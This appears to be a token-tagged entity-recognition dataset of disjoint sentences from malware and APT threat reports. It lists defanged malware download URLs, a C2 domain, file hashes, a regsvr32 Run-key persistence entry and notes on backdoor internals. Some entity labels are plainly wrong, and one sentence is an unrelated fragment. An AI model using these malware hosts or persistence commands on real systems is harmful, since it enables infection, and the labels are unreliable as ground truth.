Tracing	O
backwards	O
up	O
the	O
stack	O
,	O
we	O
follow	O
the	O
reference	O
to	O
EAX	O
as	O
the	O
baton	O
is	O
passed	O
from	O
register	O
to	O
register	O
.	O

BRIEF	O
DESCRIPTION	O
ZxShell	B-malware.backdoor
GetProcAddress	O
implementation	O
FUNCTION	O
NAME	O
ZxGetLibAndProcAddr	O
CopyMemoryFromNewMsvcrt	O
ZxShell	B-malware.backdoor
memory	O
copy	O
routine	O
ServiceExists	O
ProcessScCommand	O
AnalyseAndLoadPlugins	O
DeleteAndLogPlugin	O
KeyloggerThread	O
GetIpListAndConnect	O
BuildTargetIpListStruct	O
DoHandshake	O
GetLocalPcDescrStr	O
MainConnectionIo	O
ReceiveCommandData	O
ProcessCommand	O
OFFSET	O
0x12CDA	O
0x12C4C	O
0x0A7C7	O
Get	O
if	O
a	O
service	O
is	O
installed	O
in	O
the	O
system	O
or	O
not	O
0x0E3EF	O
ZxShell	B-malware.backdoor
'	O
SC	O
'	O
command	O
implementation	O
0x0127B7	O
Parse	O
the	O
installed	O
plugin	O
list	O
and	O
load	O
each	O
one	O
of	O
them	O
0x012597	O
Delete	O
a	O
corrupted	O
plugin	O
and	O
log	O
the	O
problem	O
ZxShell	B-malware.backdoor
keylogger	O
implementation	O
0x0D591	O
Analyse	O
the	O
IP	O
list	O
inside	O
the	O
ZxShell	B-malware.backdoor
PE	O
and	O
tries	O
to	O
connect	O
0x011496	O
Build	O
remote	O
server	O
Ip	O
list	O
structure	O
Perform	O
initial	O
connection	O
handshake	O
Build	O
a	O
string	O
containing	O
the	O
target	O
workstation	O
data	O
ZxShell	B-malware.backdoor
main	O
connection	O
I/O	O
routine	O
Receive	O
each	O
byte	O
from	O
the	O
socket	O
until	O
a	O
newline	O
char	O
Main	O
ZxShell	B-malware.backdoor
command	O
processing	O
routine	O
0x11419	O
0xB8E8	O
0x0B627	O
0x1126C	O
0x016DF	O
0x10C2B	O

hxxp://servicesprocessing[.]com/naspckn/plugins/wsutils.exe	B-url.unknown
hxxp://servicesprocessing[.]com/naspckn/plugins/shlwapi.exe	B-url.unknown
hxxp://servicesprocessing[.]com/panomasi/plugins/shlwapi.exe	B-url.unknown
:	O
md5	O
eeaf96b1988c7016780c0d91ce2451c8	B-hash

The	O
malware	O
then	O
collects	O
system	O
information	O
like	O
the	O
c	O
omputer	O
name	O
,	O
operating	O
system	O
caption	O
,	O
IP	O
address	O
of	O
the	O
infected	O
system	O
,	O
product	O
version	O
of	O
the	O
executable	O
file	O
and	O
sends	O
it	O
to	O
the	O
C2	O
server	O
along	O
with	O
the	O
generated	O
user	O
name	O
and	O
password	O
using	O
a	O
POST	O
request	O
to	O
postdata.php	O
.	O

Our	O
colleagues	O
at	O
ESET	O
have	O
published	O
their	O
own	O
excellent	O
analysis	O
suggesting	O
a	O
possible	O
link	O
between	O
ExPetr/Petya	O
and	O
TeleBots	O
(	O
BlackEnergy	O
)	O
.	O

Key	O
:	O
Value	O
name	O
:	O
AdobePlayer	O
Value	O
data	O
:	O
regsvr32	O
/s	O
'	O
C	O
:	O
\Documents	O
and	O
Settings\	O
[	O
USER_NAME	O
]	O
\Application	O
Data\adobe\adobe.dat	O
'	O
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run	O

The	O
zip	O
file	O
extracts	O
to	O
a	O
Windows	O
Shortcut	O
file	O
with	O
the	O
same	O
name	O
and	O
a	O
.lnk	O
extension	O
.	O

The	O
malware	O
has	O
several	O
modules	O
,	O
some	O
of	O
which	O
are	O
:	O
Taking	O
a	O
screenshot	O
of	O
the	O
infected	O
machine	O
and	O
sending	O
it	O
to	O
the	O
C	O
&	O
C	O
server	O
.	O

The	O
title	O
of	O
the	O
email	O
field	O
is	O
'	O
FPAP	O
Email	O
'	O
,	O
'	O
FPAP	O
'	O
could	O
stand	O
for	O
'	O
Family	O
Planning	O
Association	O
of	O
Pakistan	O
.	O
'	O

Value	O

It	O
's	O
common	O
to	O
observe	O
attacks	O
pulled	O
off	O
successfully	O
without	O
any	O
particular	O
sophistication	O
in	O
place	O
,	O
including	O
the	O
incidents	O
described	O
in	O
this	O
post	O
.	O

To	O
achieve	O
that	O
,	O
the	O
SWIFT	O
messages	O
the	O
malware	O
locates	O
are	O
read	O
,	O
parsed	O
,	O
and	O
converted	O
into	O
PRT	O
files	O
that	O
describe	O
the	O
text	O
in	O
Printer	O
Command	O
Language	O
(	O
PCL	O
)	O
.	O

In	O
the	O
realm	O
of	O
quantum	O
mechanics	O
,	O
entanglement	O
is	O
a	O
peculiar	O
phenomenon	O
in	O
which	O
a	O
.	O

Description	O

These	O
targets	O
include	O
foreign	O
affairs	O
government	O
organizations	O
both	O
localized	O
and	O
abroad	O
,	O
and	O
defense	O
organizations	O
'	O
presence	O
localized	O
,	O
located	O
in	O
Europe	O
and	O
also	O
located	O
in	O
Afghanistan	O
.	O

As	O
we	O
can	O
see	O
,	O
the	O
attack	O
surface	O
covered	O
by	O
the	O
hacker	O
group	O
is	O
incredibly	O
wide	O
:	O
there	O
are	O
two	O
different	O
C2Cs	O
in	O
Europe	O
and	O
another	O
one	O
in	O
China	O
to	O
mislead	O
the	O
analysis	O
and	O
this	O
create	O
confusion	O
during	O
the	O
reconstruction	O
of	O
the	O
complete	O
cyber-attack	O
.	O

The	O
profile	O
has	O
also	O
been	O
disabled	O
in	O
the	O
months	O
after	O
we	O
published	O
the	O
first	O
report	O
.	O

Module	O
Purpose	O

Due	O
to	O
patches	O
and	O
other	O
protective	O
mechanism	O
,	O
N-day	B-malware.unknown
exploits	O
will	O
frequently	O
cause	O
a	O
prompt	O
,	O
warning	O
,	O
popup	O
or	O
flat	O
out	O
will	O
not	O
work	O
.	O

On	O
the	O
right	O
side	O
of	O
the	O
diagram	O
are	O
files	O
used	O
in	O
two	O
other	O
campaigns	O
using	O
the	O
ArcomRAT	B-malware.backdoor
8	O
and	O
DarkComet	B-malware.backdoor
6,7	O
,	O
The	O
fact	O
that	O
they	O
share	O
the	O
same	O
command-and-control	O
infrastructure	O
as	O
the	O
UnrecomRat	B-malware.backdoor
campaign	O
make	O
this	O
central	O
node	O
all	O
the	O
more	O
interesting	O
.	O

When	O
the	O
victim	O
executes	O
the	O
Windows	O
shortcut	O
,	O
they	O
are	O
directed	O
to	O
one	O
of	O
several	O
malicious	O
links	O
depending	O
on	O
the	O
zipfile	O
that	O
they	O
were	O
sent	O
.	O

15nXl9eZ15PXlCAg157XmdeV15fXk9eq	O

By	O
using	O
and	O
f	O
urther	O
navigating	O
this	O
website	O
you	O
accept	O
that	O
some	O
of	O
your	O
browsing	O
activity	O
can	O
be	O
recorded	O
in	O
cookies	O
.	O

This	O
is	O
a	O
simple	O
way	O
to	O
track	O
the	O
activity	O
of	O
these	O
actors	O
by	O
using	O
both	O
passive	O
DNS	O
data	O
and	O
configuration	O
information	O
extracted	O
from	O
XtremeRAT	B-malware.backdoor
.	O

The	O
remainder	O
of	O
the	O
code	O
,	O
other	O
than	O
the	O
borrowed	O
MBR	O
,	O
was	O
implemented	O
by	O
the	O
authors	O
themselves	O
.	O

A5DE87646EE943CD1F448A67FDBE2817	B-hash
hint.zapto.org	B-url.cncsvr

AppManifest.xaml	O
Shell_siver.dll	O
System.Xml.Linq.dll	O

Secondly	O
we	O
conduct	O
a	O
comparative	O
study	O
of	O
Dark	O
Seoul	O
by	O
looking	O
at	O
prior	O
cyber	O
attacks	O
,	O
namely	O
Stuxnet	B-malware.backdoor
,	O
10	O
Days	O
of	O
Rain	O
,	O
and	O
the	O
SK	O
Communications	O
breach	O
.	O

Word	O
document	O
,	O
contained	O
in	O
SFX	O
RAR	O
file	O
15FC009D9CAAA8F11D6C3DA2B69EA06E	B-hash

After	O
checking	O
to	O
make	O
sure	O
neither	O
the	O
source	O
nor	O
key	O
strings	O
are	O
empty	O
,	O
the	O
function	O
gets	O
down	O
to	O
business	O
.	O

Injected	O

It	O
is	O
easy	O
to	O
expect	O
deliberate	O
changes	O
within	O
this	O
group	O
in	O
2018	O
,	O
with	O
even	O
more	O
.Net	O
,	O
Delphi	O
,	O
and	O
powershell	O
ports	O
of	O
various	O
tools	O
appearing	O
at	O
Sofacy	O
targets	O
throughout	O
the	O
year	O
.	O

The	O
code	O
of	O
mrxcls	O
and	O
jmidebs	O
drivers	O
is	O
largely	O
similar	O
.	O

McAfee	O
Product	O
Coverage	O
*	O

GNU	O
HTTPTunnel	O
:	O
An	O
open-source	O
tool	O
that	O
can	O
create	O
a	O
bidirectional	O
HTTP	O
tunnel	O
on	O
Linux	O
computers	O
,	O
potentially	O
allowing	O
communication	O
beyond	O
a	O
restrictive	O
 rewall	O
.	O

This	O
write-up	O
provides	O
initial	O
disclosure	O
of	O
a	O
portion	O
of	O
the	O
malware	O
and	O
infrastructure	O
used	O
by	O
the	O
Ghost	O
Dragon	O
group	O
and	O
covers	O
the	O
new	O
security	O
mechanisms	O
in	O
detail	O
,	O
as	O
well	O
as	O
revealing	O
how	O
researchers	O
were	O
able	O
to	O
communicate	O
with	O
the	O
custom	O
implant	O
by	O
rebuilding	O
and	O
compiling	O
a	O
customized	O
Gh0st	B-malware.backdoor
RAT	I-malware.backdoor
controller	O
.	O

Figure	O
27	O
.	O

The	O
information	O
contained	O
in	O
this	O
document	O
has	O
been	O
prepared	O
as	O
a	O
matter	O
of	O
interest	O
and	O
for	O
information	O
purposes	O
only	O
,	O
and	O
does	O
not	O
constitute	O
professional	O
advice	O
.	O

Volexity	B-malware.backdoor
has	O
yet	O
to	O
actually	O
see	O
the	O
contents	O
of	O
the	O
file	O
o.js	O
,	O
as	O
the	O
websites	O
has	O
continuously	O
returned	O
HTTP	O
403	O
responses	O
each	O
time	O
it	O
was	O
requested	O
.	O

The	O
executable	O
file	O
compressor	O
UPX	O
unpacks	O
the	O
binary	O
to	O
reveal	O
details	O
hidden	O
by	O
the	O
packer	O
.	O

Secure	O
logs	O
,	O
potentially	O
in	O
a	O
centralized	O
location	O
,	O
and	O
protect	O
them	O
from	O
modification	O
.	O

JRat	B-malware.backdoor
is	O
a	O
commercially	O
available	O
remote	O
access	O
tool	O
(	O
RAT	B-malware.unknown
)	O
,	O
written	O
in	O
Java	O
.	O

When	O
opened	O
,	O
the	O
client	O
displays	O
example	O
shell	O
entries	O
that	O
point	O
to	O
www.maicaidao.com	B-url.unknown
,	O
which	O
originally	O
hosted	O
components	O
of	O
the	O
Web	B-malware.ransom
shell	O
.	O

This	O
download	O
link	O
(	O
hxxp://techto-earth[.]com/eastwing/download/sppsvc.exe	B-url.cncsvr
)	O
was	O
at	O
the	O
point	O
of	O
writing	O
live	O
,	O
and	O
the	O
downloaded	O
executable	O
(	O
md5	O
c571b77469ad3c5ef336860605ee85c6	B-hash
)	O
was	O
verified	O
as	O
a	O
PyInstaller-based	O
malware	O
.	O

An	O
ironic	O
,	O
yet	O
noteworthy	O
observation	O
is	O
that	O
the	O
Tranchulas	O
website	O
boasts	O
Telenor	O
as	O
a	O
client	O
.	O

GravityRAT	B-malware.drop
has	O
been	O
under	O
ongoing	O
development	O
for	O
at	O
least	O
18	O
months	O
,	O
during	O
which	O
the	O
developer	O
has	O
implemented	O
new	O
features	O
.	O

We	O
have	O
uncovered	O
two	O
distinct	O
attack	O
campaigns	O
originating	O
from	O
different	O
geographic	O
regions	O
in	O
China	O
using	O
similar	O
tools	O
,	O
techniques	O
and	O
procedures	O
(	O
TTPs	O
)	O
.	O

This	O
is	O
a	O
typical	O
technique	O
used	O
by	O
Meterpreter	O
stagers	O
.	O

In	O
case	O
where	O
it	O
detects	O
anti-virus	O
software	O
,	O
Asruex	B-malware.drop
generates	O
a	O
DLL	O
file	O
and	O
loads	O
it	O
to	O
itself	O
(	O
but	O
does	O
not	O
perform	O
DLL	O
injection	O
)	O
.	O

The	O
Iranian	O
attacks	O
in	O
2012	O
and	O
2014	O
were	O
in	O
contrast	O
to	O
the	O
relatively	O
slow	O
and	O
methodical	O
work	O
of	O
APT	O
33	O
,	O
APT	O
34	O
,	O
and	O
APT	O
35	O
,	O
developing	O
custom	O
malware	O
,	O
targeting	O
data	O
exfiltration	O
from	O
strategic	O
intelligence	O
targets	O
such	O
as	O
U.S.	O
military	O
contractors	O
,	O
Middle	O
East	O
energy	O
companies	O
,	O
and	O
university	O
research	O
networks	O
.	O

We	O
believe	O
that	O
this	O
indicates	O
that	O
Gamma	O
either	O
independently	O
changed	O
the	O
FinSpy	B-malware.backdoor
protocol	I-malware.backdoor
,	O
or	O
was	O
able	O
to	O
determine	O
key	O
elements	O
of	O
our	O
fingerprint	O
,	O
although	O
it	O
has	O
never	O
been	O
publicly	O
revealed	O
.	O

DWORD	O
dwCommandType	O
;	O
DWORD	O
dwLastError	O
;	O

beautifl@mail.bg	O
ennemyman@mail.bg	O
fasionman@mail.bg	O
happylove@mail.bg	O
lovest000@mail.bg	O
monneyman@mail.bg	O
sportsman@mail.bg	O
veryhappy@mail.bg	O

page	O
|	O
3	O

Although	O
the	O
actual	O
VBS	O
script	O
changed	O
from	O
sample	O
to	O
sample	O
,	O
with	O
different	O
levels	O
of	O
obfuscation	O
and	O
different	O
ways	O
of	O
invoking	O
the	O
next	O
stage	O
of	O
process	O
tree	O
,	O
its	O
final	O
purpose	O
remained	O
same	O
:	O
invoking	O
PowerShell	O
to	O
decode	O
the	O
Base64	O
encoded	O
PowerShell	O
command	O
in	O
the	O
INI	O
file	O
that	O
was	O
dropped	O
earlier	O
by	O
the	O
macro	O
,	O
and	O
executing	O
it	O
.	O

Haroon­ur­Rashid/Administrator	O

Gen.3	O
Trojan-FH-DR	O
!	O
75D3D1F23628	O
Trojan.FHDR!tr	O
Trojan-FHDR	O
!	O

The	O
trojan	O
attempts	O
to	O
exploit	O
a	O
vulnerability	O
–	O
CVE-2015-2426	O
in	O
the	O
OpenType	O
manager	O
module	O
(	O
ATMFD.dll	O
)	O
–	O
which	O
was	O
patched	O
by	O
Microsoft	O
in	O
MS15-078	O
.	O

It	O
adds	O
the	O
SeLoadDriver	O
privilege	O
to	O
its	O
access	O
token	O
and	O
proceeds	O
to	O
install	O
the	O
driver	O
as	O
a	O
fake	O
disk	O
filter	O
driver	O
.	O

A	O
fake	O
'	O
svchost.exe	B-malware.drop
'	O
is	O
installed	O
in	O
the	O
victim	O
's	O
Application	O
Data	O
directory	O
.	O

When	O
scada.exe	B-malware.unknown
executes	O
,	O
it	O
scans	O
drives	O
attached	O
to	O
the	O
system	O
for	O
filenames	O
ending	O
in	O
Step7ProSim.dll	O
.	O

The	O
Ham	B-malware.backdoor
Backdoor	I-malware.backdoor

The	O
obfuscation	O
is	O
based	O
on	O
pairs	O
of	O
complementary	O
conditional	O
jump	O
instructions	O
.	O

Legitimate	O
versions	O
of	O
the	O
Freegate	B-malware.infosteal
software	O
are	O
available	O
for	O
download	O
on	O
its	O
website	O
.	O

Hussarini	B-malware.backdoor
protocol	O
The	O
initial	O
data	O
it	O
sends	O
contains	O
the	O
generated	O
ServerID	O
,	O
the	O
size	O
,	O
and	O
the	O
checksum	O
of	O
the	O
message	O
.	O

We	O
can	O
notice	O
only	O
two	O
changes	O
:	O
The	O
author	O
patched	O
several	O
bugs	O
;	O
Four	O
new	O
exports	O
appear	O
:	O
DllCanUnLoadNow	O
(	O
)	O
,	O
DllGetClassObject	O
(	O
)	O
,	O
DllRegisterServer	O
(	O
)	O
,	O
DllUnregisterServer	O
(	O
)	O
.	O

Figure	O
5	O

If	O
Asruex	B-malware.drop
detects	O
itself	O
being	O
operated	O
in	O
an	O
environment	O
under	O
any	O
of	O
the	O
following	O
conditions	O
(	O
Table	O
A-1	O
to	O
A-6	O
)	O
,	O
it	O
recognises	O
that	O
it	O
is	O
an	O
analysis	O
environment	O
and	O
stops	O
running	O
.	O

Command	O
'	O
exeu	O
'	O
-	O
process	O
creation	O
in	O
a	O
domain	O
environment	O

The	O
Moafee	B-malware.infosteal
campaign	O
targets	O
government	O
and	O
military	O
organizations	O
in	O
countries	O
with	O
national	O
interests	O
in	O
the	O
South	O
China	O
Sea	O
.	O

Instead	O
,	O
it	O
will	O
proceed	O
into	O
setting	O
result	O
to	O
0	O
(	O
success	O
)	O
.	O

Oldest	O
known	O
CozyDuke	B-malware.drop
main	O
module	O

Also	O
common	O
among	O
all	O
of	O
the	O
families	O
seems	O
to	O
be	O
to	O
hold	O
system	O
specific	O
configuration	O
data	O
in	O
memory	O
at	O
runtime	O
,	O
although	O
this	O
holds	O
true	O
for	O
a	O
lot	O
of	O
malware	O
.	O

AMP	O
Threat	O
Grid	O
helps	O
identify	O
malicious	O
binaries	O
and	O
build	O
protection	O
into	O
all	O
Cisco	O
Security	O
products	O
.	O

CVE­2010­3333	O

16	O

If	O
the	O
user	O
clicks	O
the	O
OK	O
button	O
,	O
the	O
user	O
is	O
directed	O
to	O
a	O
page	O
requesting	O
their	O
name	O
and	O
national	O
identification	O
number	O
.	O

The	O
dropped	O
DLL	O
is	O
loaded	O
into	O
its	O
own	O
svchost.exe	O
process	O
.	O

There	O
are	O
a	O
lot	O
of	O
malicious	O
programs	O
involved	O
in	O
this	O
campaign	O
but	O
,	O
strangely	O
,	O
they	O
each	O
implement	O
a	O
single	O
spying	O
function	O
.	O

Pour	O
plus	O
d'informations	O
sur	O
l'actualité	O
virale	O
:	O
http://www.securelist.com	B-url.normal

The	O
DownExecute	B-malware.infosteal
malware	O
is	O
used	O
as	O
a	O
way	O
for	O
the	O
attackers	O
to	O
gain	O
an	O
initial	O
foothold	O
on	O
the	O
victim	O
machine	O
.	O

The	O
dropper	O
name	O
always	O
matched	O
the	O
promised	O
content	O
of	O
the	O
spear	O
phishing	O
email	O
.	O

Upon	O
obtaining	O
the	O
files	O
on	O
the	O
FTP	O
server	O
,	O
an	O
older	O
Gh0st	B-malware.backdoor
RAT	I-malware.backdoor
variant	O
was	O
obtained	O
with	O
the	O
file	O
name	O
'	O
operas.exe	O
'	O
.	O

THURSD	O
AY	O
,	O
J	O
U	O
LY	O
1	O
2	O
,	O
2018	O

Below	O
screen	O
shots	O
show	O
the	O
code	O
that	O
collects	O
the	O
system	O
information	O
and	O
the	O
data	O
that	O
is	O
sent	O
to	O
the	O
attacker	O
.	O

T	O
imber	O
sales	O
,	O
construction	O
T	O
ennis	O
club	O
website	O
Online	O
store	O
for	O
farmers	O
Online	O
store	O
of	O
massage	O
equipment	O
Online	O
clothes	O
store	O
Website	O
development	O
and	O
promotion	O
Online	O
air	O
conditioner	O
store	O
Analytical	O
company	O
Web	O
server	O
with	O
many	O
domains	O
Web	O
server	O
with	O
many	O
domains	O
Unknown	O
server	O
Flight	O
tracker	O

All	O
the	O
technical	O
details	O
point	O
to	O
an	O
actor	O
based	O
in	O
the	O
same	O
country	O
as	O
the	O
victims	O
:	O
India	O
.	O

8	O
.	O

is	O
derived	O
from	O
the	O
class	O
meaning	O
that	O
the	O
processing	O
of	O
commands	O
should	O
be	O
contained	O
within	O
the	O
PCC_FILE	O
:	O
:ProcessPacket	O
member	O
function	O
with	O
some	O
additional	O
processing	O
done	O
in	O
the	O
PCC_FILE	O
:	O
:ReadWaitingData	O
member	O
function	O
.	O

Similar	O
to	O
the	O
Spanish	O
network	O
interactions	O
,	O
very	O
large	O
data	O
volumes	O
were	O
exchanged	O
between	O
the	O
two	O
networks	O
,	O
denoting	O
strong	O
interest	O
.	O

Figure	O
3	O
depicts	O
the	O
macro	O
embedded	O
within	O
the	O
XLSM	O
file	O
(	O
MD5	O
:	O
38125a991efc6ab02f7134db0ebe21b6	B-hash
)	O
.	O

Turla	O
Carbon	B-malware.backdoor
Pfinet	O
backdoors	O

The	O
DNS	O
queries	O
are	O
constructed	O
from	O
the	O
following	O
sections	O
:	O
1	O
.	O

Specifically	O
,	O
Israel	O
,	O
Saudi	O
Arabia	O
,	O
United	O
States	O
,	O
and	O
Iraq	O
have	O
been	O
frequent	O
targets	O
of	O
Iranian-funded	O
military	O
actions	O
,	O
most	O
recently	O
through	O
Houthi	O
rebels	O
in	O
Yemen	O
,	O
and	O
Hezbollah	O
everywhere	O
else	O
.	O

Trend	O
Micro	O
.	O

Terminate	O
the	O
current	O
network	O
connection	O
between	O
the	O
client	O
and	O
the	O
server	O
variant	O
.	O

The	O
first	O
stage	O
shellcode	O
searches	O
for	O
the	O
marker	O
'	O
GfCv	O
'	O
then	O
checks	O
the	O
next	O
four	O
bytes	O
are	O
'	O
EF	O
FE	O
EC	O
CE	O
'	O
in	O
the	O
document	O
then	O
decodes	O
the	O
second	O
stage	O
shellcode	O
using	O
the	O
four-byte	O
XOR	O
key	O
'	O
0x29F7C592	O
'	O
.	O

reports-pdf.jar	B-malware.infosteal

Table	O
3	O
shows	O
the	O
time	O
stamps	O
pulled	O
from	O
the	O
MFT	O
for	O
our	O
Web	B-malware.ransom
shell	O
file	O
before	O
and	O
after	O
the	O
time	O
stamps	O
were	O
modified	O
.	O

At	O
the	O
end	O
of	O
the	O
exploitation	O
chain	O
,	O
the	O
server	O
sends	O
a	O
legitimate	O
PDF	O
file	O
to	O
user	O
–	O
'	O
china.pdf	O
'	O
.	O

ATD	O
is	O
an	O
alliance	O
of	O
people	O
and	O
organizations	O
dedicated	O
to	O
democracy	O
and	O
universal	O
suffrage	O
in	O
Hong	O
Kong	O
.	O

The	O
attacker	O
uses	O
this	O
initial	O
information	O
as	O
a	O
fi	O
ngerprint	O
of	O
the	O
system	O
,	O
which	O
proves	O
extremely	O
useful	O
in	O
determining	O
the	O
importance	O
of	O
the	O
infected	O
target	O
and	O
its	O
potential	O
role	O
on	O
the	O
network	O
.	O

For	O
detailed	O
information	O
tying	O
Operation	O
Cobalt	O
Kitty	O
to	O
the	O
OceanLotus	O
Group	O
,	O
please	O
see	O
our	O
Attacker	O
's	O
Arsenal	O
and	O
Threat	O
Actor	O
Profile	O
sections	O
.	O

This	O
could	O
be	O
because	O
our	O
boot	O
sector	O
was	O
at	O
sector	O
56	O
and	O
not	O
63	O
,	O
or	O
because	O
the	O
multiple	O
partitions	O
clash	O
when	O
trying	O
to	O
add	O
them	O
in	O
.	O

Likewise	O
,	O
when	O
a	O
DarkComet	B-malware.backdoor
C	O
&	O
C	O
issues	O
attacks	O
command	O
,	O
the	O
encrypted	O
traffic	O
on	O
the	O
wire	O
looks	O
like	O
these	O
examples	O
:	O

Those	O
decoy	O
documents	O
are	O
written	O
in	O
Japanese	O
,	O
but	O
some	O
are	O
also	O
in	O
Chinese	O
,	O
which	O
implies	O
that	O
the	O
target	O
for	O
this	O
attack	O
is	O
not	O
limited	O
to	O
Japanese	O
organisations	O
.	O

As	O
usually	O
happens	O
with	O
these	O
big	O
operations	O
,	O
considering	O
the	O
huge	O
investment	O
and	O
number	O
of	O
resources	O
behind	O
it	O
,	O
they	O
do	O
n't	O
just	O
'	O
go	O
away	O
'	O
forever	O
.	O

Files	O
are	O
uploaded	O
on-demand	O
.	O

We	O
believe	O
Duqu	B-malware.infosteal
and	O
Stuxnet	B-malware.backdoor
were	O
simultaneous	O
projects	O
supported	O
by	O
the	O
same	O
team	O
of	O
developers	O
.	O

The	O
first	O
code	O
block	O
in	O
the	O
above	O
IDA	O
listing	O
chooses	O
which	O
element	O
of	O
stable_var_41C	O
should	O
be	O
swapped	O
with	O
the	O
element	O
.	O

If	O
the	O
first	O
source	O
byte	O
in	O
the	O
pair	O
has	O
value	O
0x39	O
or	O
less	O
,	O
the	O
bot	O
will	O
subtract	O
0x30	O
from	O
it	O
and	O
save	O
the	O
result	O
to	O
the	O
current	O
index	O
within	O
the	O
output	O
buffer	O
:	O

To	O
defeat	O
DbgBreakPoint	O
based	O
debuggers	O
,	O
the	O
malware	O
finds	O
the	O
address	O
of	O
DbgBreakPoint	O
,	O
makes	O
the	O
page	O
EXECUTE_READWRITE	O
and	O
writes	O
a	O
NOP	O
on	O
the	O
entry	O
point	O
of	O
DbgBreakPoint	O
.	O

This	O
adds	O
an	O
interesting	O
dimension	O
to	O
the	O
story	O
.	O

Just	O
after	O
a	O
few	O
IDAPython	O
scripts	O
that	O
retrieve	O
all	O
possible	O
encoded	O
strings	O
and	O
automatically	O
generates	O
the	O
assembly	O
code	O
that	O
calls	O
,	O
we	O
can	O
come	O
up	O
with	O
a	O
new	O
IDA	O
listing	O
that	O
shows	O
the	O
decoded	O
string	O
as	O
the	O
comment	O
.	O

7c52c340ec5c6f57ef2fd174e6490433	O
-	O
adobe_flash_player.exe	O
030f5fdb78bfc1ce7b459d3cc2cf1877	O
-	O
Shockwave_Flash_Player.exe	O

Point	O
B.	O
represents	O
the	O
initial	O
svchost.exe	O
startup	O
,	O
which	O
is	O
loading	O
the	O
malware	O
payload	O
.	O

T	O
he	O
sites	O
and	O
servers	O
on	O
this	O
list	O
do	O
not	O
seem	O
to	O
have	O
anything	O
in	O
common	O
.	O

Packet	O
:	O
:getCommand	O
)	O
:	O

msfte.dll	O

(	O
d3e0b129bad263e6c0dcb1a9da55978b	B-hash
)	O
An	O
analysis	O
of	O
the	O
malware	O
and	O
other	O
parts	O
of	O
the	O
campaign	O
was	O
published	O
by	O
Mcafee	O
in	O
on	O
November	O
11	O
,	O
2016	O
.	O

The	O
encrypted	O
confi	O
gurations	O
previously	O
located	O
will	O
be	O
decrypted	O
using	O
AES	O
.	O

testing	O

1302_E63C5C8F	O
-	O
>	O
is	O
the	O
botID_volume-serial-number	O
Process	O
Hacker	O
[	O
WIN-T9UN4HIIHEC\Administrator	O
]	O
+	O
-	O
>	O
Reports	O
open	O
window	O
,	O
In	O
my	O
case	O
I	O
was	O
using	O
a	O
tool	O
called	O
Process	O
Hacker	O
,	O
The	O
information	O
on	O
the	O
open	O
window	O
lets	O
the	O
attacker	O
know	O
what	O
tools	O
are	O
running	O
on	O
the	O
system	O
or	O
if	O
analysis	O
tools	O
are	O
used	O
to	O
inspect	O
the	O
malware	O
.	O

Word.exe	O
,	O
an	O
XtremeRat	B-malware.backdoor
backdoor	O
executable	O
2.ico	O
,	O
an	O
icon	O
file	O
barrage.doc	O
,	O
an	O
innocent	O
document	O
containing	O
pictures	O
(	O
above	O
)	O

The	O
server	O
has	O
been	O
detected	O
in	O
every	O
round	O
of	O
scanning	O
,	O
and	O
remains	O
operational	O
at	O
the	O
time	O
of	O
this	O
writing	O
.	O

Abilities	O
include	O
uploading	O
and	O
downloading	O
files	O
to	O
and	O
from	O
the	O
target	O
,	O
using	O
the	O
file-retrieval	O
tool	O
Wget	O
to	O
download	O
files	O
from	O
the	O
Web	O
to	O
the	O
target	O
.	O

However	O
,	O
in	O
early	O
September	O
the	O
JavaScript	O
was	O
pre-pended	O
to	O
the	O
file	O
http://parts.nikkei.com/parts/SC/s_cDS.js	B-url.unknown
as	I-url.unknown
seen	O
in	O
the	O
screen	O
shot	O
below	O
.	O

This	O
PE	O
sample	O
was	O
firstly	O
uploaded	O
to	O
Virustotal	O
on	O
May	O
2	O
,	O
2015	O
:	O

inject	O
Interval	O
delete_cmd	O
broadcast_cmd	O
:	O

The	O
steganography	O
tool	O
works	O
by	O
embedding	O
the	O
bytes	O
of	O
a	O
script	O
into	O
the	O
pixels	O
of	O
the	O
image	O
 le	O
,	O
giving	O
the	O
attacker	O
the	O
ability	O
to	O
hide	O
malicious	O
PowerShell	O
code	O
in	O
a	O
visible	O
image	O
on	O
a	O
remote	O
server	O
.	O

0x10	O
indicating	O
an	O
error	O
and	O
terminating	O
the	O
remote	O
shell	O
session	O
.	O

World	O
Anti-Doping	O
Agency	O
(	O
WADA	O
)	O

Those	O
who	O
argue	O
loudest	O
against	O
such	O
assertions	O
cite	O
Sofacy	O
's	O
prolific	O
criminal	O
profit	O
as	O
evidence	O
that	O
they	O
are	O
most	O
likely	O
not	O
agents	O
of	O
the	O
Federal	O
Security	O
Service	O
(	O
FSB	O
)	O
;	O
while	O
others	O
suppose	O
that	O
the	O
crimes	O
committed	O
bearing	O
Sofacy	O
's	O
unique	O
signatures	O
is	O
a	O
perfect	O
cover	O
behind	O
which	O
the	O
Russian	O
Government	O
prefers	O
to	O
remain	O
.	O

Lastly	O
,	O
we	O
discovered	O
encrypted	O
data	O
dumps	O
from	O
yet	O
more	O
campaigns	O
,	O
which	O
we	O
were	O
unable	O
at	O
the	O
time	O
of	O
this	O
report	O
.	O

In	O
one	O
cluster	O
of	O
ScanBox	B-malware.infosteal
activity	O
,	O
instead	O
of	O
checking	O
for	O
specific	O
files	O
as	O
per	O
the	O
method	O
above	O
,	O
the	O
attackers	O
have	O
implemented	O
a	O
different	O
method	O
of	O
tracking	O
files	O
and	O
drives	O
present	O
on	O
the	O
victim	O
machine	O
.	O

Like	O
the	O
Trojan	O
from	O
the	O
first	O
campaign	O
,	O
this	O
sample	O
checks	O
if	O
the	O
foreground	O
window	O
's	O
title	O
contains	O
names	O
of	O
Brazilian	O
banks	O
and	O
digital	O
coins	O
by	O
looking	O
for	O
hardcoded	O
strings	O
.	O

Not	O
only	O
are	O
its	O
obfuscation	O
techniques	O
becoming	O
stronger	O
,	O
but	O
its	O
anti-detection	O
technology	O
list	O
is	O
growing	O
.	O

Data	O
Source=	O
-	O
the	O
code	O
will	O
assume	O
that	O
the	O
unlabeled	O
textbox2	O
contains	O
a	O
valid	O
SQL	O
query	O
and	O
will	O
execute	O
it	O
and	O
display	O
the	O
results	O
.	O

Backdoor	B-malware.backdoor
command	O
xC0	B-malware.backdoor
:	O
Get	O
CPU	O
info	O
,	O
Windows	O
and	O
System32	O
folder	O
,	O
hostname	O
,	O
user	O
name	O
and	O
clipboard	O
content	O
Backdoor	B-malware.backdoor
command	O
x82	B-malware.backdoor
:	O
Get	O
drive	O
listings	O
and	O
types	O

The	O
DLLs	O
are	O
extracted	O
into	O
the	O
app	O
data	O
folder	O
:	O
%	O
USERPROFILE	O
%	O
